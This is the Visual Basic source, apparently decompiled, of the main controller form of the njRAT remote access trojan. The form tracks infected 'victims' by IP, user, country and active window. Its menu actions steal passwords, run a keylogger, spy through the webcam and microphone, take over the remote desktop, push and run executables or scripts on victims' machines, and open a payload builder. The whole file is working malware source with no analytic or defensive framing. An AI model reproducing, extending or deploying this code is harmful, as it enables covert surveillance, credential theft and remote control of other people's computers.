Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports WinMM
Imports NJRAT.njRAT
Imports NJRAT.Class7

Public Class Form1
    Inherits Form
    ' Methods

    Private int_0 As Integer
    Public isActive As Boolean
    Public port As Integer
    Public S As SK

    Public Sub New()
        Me.isActive = False
        Me.int_0 = 0
        Me.InitializeComponent()
    End Sub
    Public Sub dsk()
        Do While True
            Dim num As Integer = 0
            Select Case Class7.class8_0.int_2
                Case 0
                    num = 10
                    Exit Select
                Case 1
                    num = &H7D0
                    Exit Select
                Case 2
                    num = &H1388
                    Exit Select
                Case 3
                    num = &H1D4C
                    Exit Select
                Case Else
                    num = &H2710
                    Exit Select
            End Select
            If ((Me.isActive And (GClass7.smethod_0 < &H2EE0)) And (Me.L1.Columns.Item(0).Width <> 0)) Then
                Dim row As DataGridViewRow
                For Each row In Me.L1.method_3
                    If (Not row Is Nothing) Then
                        Dim tag As Client = DirectCast(row.Tag, Client)
                        If (Not tag Is Nothing) Then
                            Dim flag As Boolean = False
                            If (DateTime.Compare(tag.lastPC, DateTime.MinValue) = 0) Then
                                flag = True
                            ElseIf (DateAndTime.Now.Subtract(tag.lastPC).TotalMilliseconds >= num) Then
                                flag = True
                            End If
                            If (Not tag.Isend And flag) Then
                                tag.Isend = True
                                tag.lastPC = DateAndTime.Now
                                tag.Send(String.Concat(New String() {"CAP", Class7.string_1, Conversions.ToString(Me.L1.Columns.Item(0).Width), Class7.string_1, Conversions.ToString(Me.L1.method_6)}))
                            End If
                        End If
                    End If
                Next
            End If
            Thread.Sleep(CInt(Math.Round(CDbl((CDbl(num) / 2)))))
        Loop
    End Sub

    Private Sub Form1_Activated(sender As Object, e As EventArgs) Handles Me.Activated
        Me.isActive = True
        Me.Opacity = 1
    End Sub

    Private Sub Form1_Deactivate(sender As Object, e As EventArgs) Handles Me.Deactivate
        Me.isActive = False
        Me.Opacity = 0.95
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Me.NotifyIcon1.Visible = False
        Try
            Class7.waveOut_0.Dispose()
        Catch exception1 As Exception
        End Try
        Class7.class8_0.method_1()
        End
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
        Try
            Me.Left = ((0 - Me.Width) + Screen.PrimaryScreen.WorkingArea.Width)
            Me.Top = ((0 - Me.Height) + Screen.PrimaryScreen.WorkingArea.Height)
            Me.L1.method_11("Screen", Global.NJRAT.L1.GEnum0.Image.StretchImage, DataGridViewAutoSizeColumnMode.None)
            Me.L1.method_11("Name", Global.NJRAT.L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
            Me.L1.method_11("IP", Global.NJRAT.L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
            Me.L1.method_11("PC", Global.NJRAT.L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
            Me.L1.method_11("User", Global.NJRAT.L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
            Me.L1.method_11("Install Date", Global.NJRAT.L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
            Me.L1.method_11("Flag", Global.NJRAT.L1.GEnum0.Image, DataGridViewAutoSizeColumnMode.AllCells)
            Me.L1.method_11("Country", Global.NJRAT.L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
            Me.L1.method_11("Operating System", Global.NJRAT.L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
            Me.L1.method_11("Cam", Global.NJRAT.L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
            Me.L1.method_11("Ver", Global.NJRAT.L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
            Me.L1.method_11("Ping", Global.NJRAT.L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
            Me.L1.method_11("Active Window", Global.NJRAT.L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
            Me.L1.Columns.Item(0).Width = &H23
            Me.Show()
            Class7.notf_0.Show()
            Control.CheckForIllegalCrossThreadCalls = False
            Class7.form1_0 = Me
            Me.Text = Class7.string_0
            Me.NotifyIcon1.Text = Class7.string_0
            Me.NotifyIcon1.Icon = Me.Icon
            Me.ShowInTaskbar = True
            Me.Pp1.T.Enabled = True
            Dim str As String
            For Each str In Directory.GetFiles((Application.StartupPath & "\plugin\"), "*.dll")
                Dim item As New Class9(New FileInfo(str).Name.ToLower)
                Class7.list_1.Add(item)
            Next
            Dim str2 As String
            For Each str2 In Strings.Split("cam.dll,ch.dll,pw.dll,sc2.dll,mic.dll,plg.dll", ",", -1, CompareMethod.Binary)
                If (Class7.smethod_0(str2, Nothing) Is Nothing) Then
                    Interaction.MsgBox(("Missing dll >> " & str2), MsgBoxStyle.ApplicationModal, Nothing)
                    Select Case Strings.Split(str2, ".", -1, CompareMethod.Binary)(0)
                        Case "cam"
                            Me.RemoteCamToolStripMenuItem.Enabled = False
                            Exit Select
                        Case "ch"
                            Me.OpenChatToolStripMenuItem.Enabled = False
                            Exit Select
                        Case "plg"
                            Me.ManagerToolStripMenuItem.Enabled = False
                            Exit Select
                        Case "pw"
                            Me.GetPasswordsToolStripMenuItem.Enabled = False
                            Exit Select
                        Case "sc2"
                            Me.RemoteDesktopToolStripMenuItem.Enabled = False
                            Exit Select
                        Case "mic"
                            Me.MicrophoneToolStripMenuItem.Enabled = False
                            Exit Select
                    End Select
                End If
            Next
            Try
                Class7.waveOut_0 = New WaveOut(0)
                Class7.waveOut_0.Open(WaveFormat.Pcm8Khz8BitMono)
                Class7.waveOut_1 = New WaveOut(0)
                Class7.waveOut_1.Open(WaveFormat.Pcm44Khz16BitMono)
            Catch exception1 As Exception
                Me.MicrophoneToolStripMenuItem.Enabled = False
            End Try
            Class7.class8_0.method_0()
Label_036D:
            Try
                Dim port As New port
                port.TextBox1.Text = Class6.smethod_2("port", "5552")
                port.ShowDialog(Me)
                If (port.port < 1) Then
                    Me.Close()
                    Return
                End If
                Me.port = port.port
                Me.S = New SK(Me.port)
                Class6.smethod_3("port", Conversions.ToString(Me.port))
            Catch exception3 As Exception
                Interaction.MsgBox(exception3.Message, MsgBoxStyle.ApplicationModal, Nothing)
                GoTo Label_036D
            End Try
            Class7.sk_0 = Me.S
            Dim kad As New Thread(New ThreadStart(AddressOf Me.dsk), 1)
            kad.Start()
            Me.Timer1.Enabled = True
        Catch ex As Exception

        End Try

    End Sub

    Private Sub ToolStripStatusLabel1_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel1.Click
        If Operators.ConditionalCompareObjectEqual(Me.ToolStripStatusLabel1.Tag, "2", False) Then
            Me.ToolStripStatusLabel1.Text = "[ Logs ]"
            Me.ToolStripStatusLabel1.Tag = "1"
            Me.L1.BringToFront()
        Else
            Me.ToolStripStatusLabel1.Text = "[ Users ]"
            Me.ToolStripStatusLabel1.Tag = "2"
            Me.Pp1.BringToFront()
        End If

    End Sub

    Private Sub DisconnectToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DisconnectToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.L1.SelectedRows.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As DataGridViewRow = DirectCast(enumerator.Current, DataGridViewRow)
                Try
                    NewLateBinding.LateSetComplex(current.Tag, Nothing, "CN", New Object() {False}, Nothing, Nothing, False, True)
                    Continue Do
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError()
                    Continue Do
                End Try
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub RemoteCamToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteCamToolStripMenuItem.Click
        If (Me.L1.SelectedRows.Count <> 0) Then
            Dim enumerator As IEnumerator
            Dim class2 As Class9 = Class7.smethod_0("cam.dll", Nothing)
            Try
                enumerator = Me.L1.SelectedRows.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As DataGridViewRow = DirectCast(enumerator.Current, DataGridViewRow)
                    Class7.smethod_2(DirectCast(current.Tag, Client), class2, False)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub GetPasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GetPasswordsToolStripMenuItem.Click
        If (Me.L1.SelectedRows.Count <> 0) Then
            Dim enumerator As IEnumerator
            Dim class2 As Class9 = Class7.smethod_0("pw.dll", Nothing)
            Try
                enumerator = Me.L1.SelectedRows.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As DataGridViewRow = DirectCast(enumerator.Current, DataGridViewRow)
                    Class7.smethod_2(DirectCast(current.Tag, Client), class2, True)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub KeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KeyloggerToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.L1.SelectedRows.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As DataGridViewRow = DirectCast(enumerator.Current, DataGridViewRow)
                NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {"kl"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub ToolStripStatusLabel4_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel4.Click
        About.ShowDialog()
    End Sub

    Private Sub OpenChatToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenChatToolStripMenuItem.Click
        If (Me.L1.SelectedRows.Count <> 0) Then
            Dim enumerator As IEnumerator
            Dim class2 As Class9 = Class7.smethod_0("ch.dll", Nothing)
            Try
                enumerator = Me.L1.SelectedRows.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As DataGridViewRow = DirectCast(enumerator.Current, DataGridViewRow)
                    Class7.smethod_2(DirectCast(current.Tag, Client), class2, False)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub OpenFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenFolderToolStripMenuItem.Click
        Try
            If Not Directory.Exists(Conversions.ToString(NewLateBinding.LateGet(Me.L1.SelectedRows.Item(0).Tag, Nothing, "folder", New Object(0 - 1) {}, Nothing, Nothing, Nothing))) Then
                Directory.CreateDirectory(Conversions.ToString(NewLateBinding.LateGet(Me.L1.SelectedRows.Item(0).Tag, Nothing, "folder", New Object(0 - 1) {}, Nothing, Nothing, Nothing)))
            End If
            Dim objArray As Object() = New Object(1 - 1) {}
            Dim tag As Object = Me.L1.SelectedRows.Item(0).Tag
            objArray(0) = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(tag, Nothing, "folder", New Object(0 - 1) {}, Nothing, Nothing, Nothing))
            Dim arguments As Object() = objArray
            Dim copyBack As Boolean() = New Boolean() {True}
            NewLateBinding.LateCall(Nothing, GetType(Process), "Start", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                NewLateBinding.LateSetComplex(tag, Nothing, "folder", New Object() {RuntimeHelpers.GetObjectValue(arguments(0))}, Nothing, Nothing, True, True)
            End If
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub FromLINKToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromLINKToolStripMenuItem1.Click
        If (Me.L1.SelectedRows.Count <> 0) Then
            Dim dialog As New OpenFileDialog With {.FileName = String.Empty}
            If (dialog.ShowDialog = DialogResult.OK) Then
                Dim flag As Boolean = True
                Dim buffer As Byte() = Class6.smethod_8(File.ReadAllBytes(dialog.FileName), flag)
                Dim stream As New MemoryStream
                Dim str As String = ("rn" & Class7.string_1 & New FileInfo(dialog.FileName).Extension.Remove(0, 1) & Class7.string_1)
                stream.Write(Class6.smethod_11(str), 0, str.Length)
                stream.Write(buffer, 0, buffer.Length)
                Dim ssd As New Thread(New ParameterizedThreadStart(AddressOf Class7.smethod_4), 1)
                ssd.Start(New Object() {stream.ToArray, Me.L1.DefaultCellStyle.ForeColor})
            End If
        End If
    End Sub

    Private Sub FromDISKToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromDISKToolStripMenuItem1.Click
        If (Me.L1.SelectedRows.Count <> 0) Then
            Dim dialog As New OpenFileDialog With {.Filter = "EXE|*.exe", .FileName = String.Empty}
            If (dialog.ShowDialog = DialogResult.OK) Then
                Dim flag As Boolean = True
                Dim buffer As Byte() = Class6.smethod_8(File.ReadAllBytes(dialog.FileName), flag)
                Dim stream As New MemoryStream
                Dim str As String = ("up" & Class7.string_1)
                stream.Write(Class6.smethod_11(str), 0, str.Length)
                stream.Write(buffer, 0, buffer.Length)
                Dim jij As New Thread(New ParameterizedThreadStart(AddressOf Class7.smethod_4), 1)
                jij.Start(New Object() {stream.ToArray, Me.L1.DefaultCellStyle.ForeColor})
            End If
        End If
    End Sub

    Private Sub ScriptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ScriptToolStripMenuItem.Click
        If (Me.L1.SelectedRows.Count <> 0) Then
            Dim script As New script
            script.ShowDialog(Me)
            If (script.Code.Length > 0) Then
                Dim flag As Boolean = True
                Dim buffer As Byte() = Class6.smethod_8(Class6.smethod_11(script.Code), flag)
                Dim stream As New MemoryStream
                stream.Write(Class6.smethod_11(("rn" & Class7.string_1 & script.RunAs & Class7.string_1)), 0, Class6.smethod_11(("rn" & Class7.string_1 & script.RunAs & Class7.string_1)).Length)
                stream.Write(buffer, 0, buffer.Length)
                Dim choc As New Thread(New ParameterizedThreadStart(AddressOf Class7.smethod_4), 1)
                choc.Start(New Object() {stream.ToArray, Me.L1.DefaultCellStyle.ForeColor})
            End If
        End If
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        Dim uio As New Thread(New ParameterizedThreadStart(AddressOf Class7.smethod_4), 1)
        uio.Start(New Object() {Class6.smethod_11(("un" & Class7.string_1 & "~")), Me.L1.DefaultCellStyle.ForeColor})
    End Sub

    Private Sub MicrophoneToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MicrophoneToolStripMenuItem.Click
        If (Me.L1.SelectedRows.Count <> 0) Then
            Dim enumerator As IEnumerator
            Dim class2 As Class7.Class9 = Class7.smethod_0("mic.dll", Nothing)
            Try
                enumerator = Me.L1.SelectedRows.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As DataGridViewRow = DirectCast(enumerator.Current, DataGridViewRow)
                    Class7.smethod_2(DirectCast(current.Tag, Client), class2, False)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub ToolStripStatusLabel5_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel5.Click
        Dim lola As New STNG() With {.StartPosition = FormStartPosition.CenterParent}
        lola.ShowDialog()
    End Sub

    Private Sub ManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ManagerToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.L1.SelectedRows.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As DataGridViewRow = DirectCast(enumerator.Current, DataGridViewRow)
                Dim tag As Client = DirectCast(current.Tag, Client)
                If (Not tag Is Nothing) Then
                    Dim manager As Manager = DirectCast(Class7.smethod_3(("m" & tag.ip)), Manager)
                    If (manager Is Nothing) Then
                        manager = New Manager With {.sk = tag, .Name = ("m" & tag.ip)}
                        manager.Show()
                    Else
                        manager.WindowState = FormWindowState.Minimized
                        manager.WindowState = FormWindowState.Normal
                    End If
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub L1_ColumnWidthChanged(sender As Object, e As DataGridViewColumnEventArgs) Handles L1.ColumnWidthChanged
        If (e.Column.Index = 0) Then
            If (e.Column.Width > 250) Then
                e.Column.Width = 250
            End If
            If (e.Column.Width < &H23) Then
                e.Column.Width = &H23
            End If
            Me.L1.method_7(CInt(Math.Round(CDbl((e.Column.Width * 0.67)))))
        End If
    End Sub

    Private Sub NotifyIcon1_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles NotifyIcon1.MouseDoubleClick
        Try
            Interaction.AppActivate(Me.Text)
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub ShowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem.Click
        Try
            Interaction.AppActivate(Me.Text)
        Catch exception1 As Exception
        End Try
    End Sub

    Private Sub RestartToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem1.Click
        Process.Start(Application.ExecutablePath)
        Me.Close()
    End Sub

    Private Sub ExitToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExitToolStripMenuItem.Click
        Me.Close()
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        Dim sak As New Thread(New ParameterizedThreadStart(AddressOf Class7.smethod_4), 1)
        sak.Start(New Object() {Class6.smethod_11(("un" & Class7.string_1 & "@")), Me.L1.DefaultCellStyle.ForeColor})
    End Sub

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        Dim kio As New Thread(New ParameterizedThreadStart(AddressOf Class7.smethod_4), 1)
        kio.Start(New Object() {Class6.smethod_11(("un" & Class7.string_1 & "!")), Me.L1.DefaultCellStyle.ForeColor})
    End Sub

    Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem.Click
        If (Me.L1.SelectedRows.Count <> 0) Then
            Dim dialog As New OpenFileDialog With {.FileName = String.Empty}
            If (dialog.ShowDialog = DialogResult.OK) Then
                Dim flag As Boolean = True
                Dim buffer As Byte() = Class6.smethod_8(File.ReadAllBytes(dialog.FileName), flag)
                Dim stream As New MemoryStream
                Dim str As String = ("rn" & Class7.string_1 & New FileInfo(dialog.FileName).Extension.Remove(0, 1) & Class7.string_1)
                stream.Write(Class6.smethod_11(str), 0, str.Length)
                stream.Write(buffer, 0, buffer.Length)
                Dim ssd As New Thread(New ParameterizedThreadStart(AddressOf Class7.smethod_4), 1)
                ssd.Start(New Object() {stream.ToArray, Me.L1.DefaultCellStyle.ForeColor})
            End If
        End If
    End Sub

    Private Sub FromLinkToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromLinkToolStripMenuItem.Click
        If (Me.L1.SelectedRows.Count <> 0) Then
            Dim furl As New FURL
            furl.ShowDialog(Me)
            If furl.IsOK Then
                Dim str As String = String.Concat(New String() {"rn", Class7.string_1, furl.TextBox2.Text, Class7.string_1, furl.TextBox1.Text})
                Dim osak As New Thread(New ParameterizedThreadStart(AddressOf Class7.smethod_4), 1)
                osak.Start(New Object() {Class6.smethod_11(str), Color.Green})
            End If
        End If
    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameToolStripMenuItem.Click
        Dim str As String = Interaction.InputBox("Enter New Name", "Rename Victim", String.Empty, -1, -1)
        If (str.Length > 0) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.L1.SelectedRows.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As DataGridViewRow = DirectCast(enumerator.Current, DataGridViewRow)
                    Try
                        NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {String.Concat(New String() {"prof", Class7.string_1, "~", Class7.string_1, "vn", Class7.string_1, Class6.smethod_14(str)})}, Nothing, Nothing, Nothing, True)
                        current.Cells.Item(Class7.int_0).Value = (str & "_" & Strings.Split(Conversions.ToString(current.Cells.Item(Class7.int_0).Value), "_", -1, CompareMethod.Binary)((Strings.Split(Conversions.ToString(current.Cells.Item(Class7.int_0).Value), "_", -1, CompareMethod.Binary).Length - 1)))
                        Continue Do
                    Catch exception1 As Exception
                        ProjectData.SetProjectError(exception1)
                        Dim exception As Exception = exception1
                        ProjectData.ClearProjectError()
                        Continue Do
                    End Try
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub ToolStripStatusLabel3_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel3.Click
        Builder.ShowDialog()
    End Sub

    Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        If (Me.L1.SelectedRows.Count <> 0) Then
            Dim enumerator As IEnumerator
            Dim class2 As Class9 = Class7.smethod_0("sc2.dll", Nothing)
            Try
                enumerator = Me.L1.SelectedRows.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As DataGridViewRow = DirectCast(enumerator.Current, DataGridViewRow)
                    Class7.smethod_2(DirectCast(current.Tag, Client), class2, False)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            Me.int_0 += 1
            If (Me.int_0 = 10) Then
                Me.int_0 = 0
                Me.upl.Text = ("Upload [" & Class6.smethod_17(Class7.long_0) & "]")
                Me.dwn.Text = ("Download [" & Class6.smethod_17(Class7.long_1) & "]")
                Class7.long_0 = 0
                Class7.long_1 = 0
            End If
            Me.Text = String.Concat(New String() {Class7.string_0, "    Port[ ", Conversions.ToString(Me.port), " ]    Online[ ", Conversions.ToString(Me.L1.RowCount), " ]    Selected[", Conversions.ToString(Me.L1.SelectedRows.Count), "] REQ[", Conversions.ToString(Me.S.REQ.Count), "]"})
            Me.conz.Text = ("Connections[" & Conversions.ToString(Me.S.Online.Count) & "]")
        Catch exception1 As Exception
        End Try
    End Sub
End Class
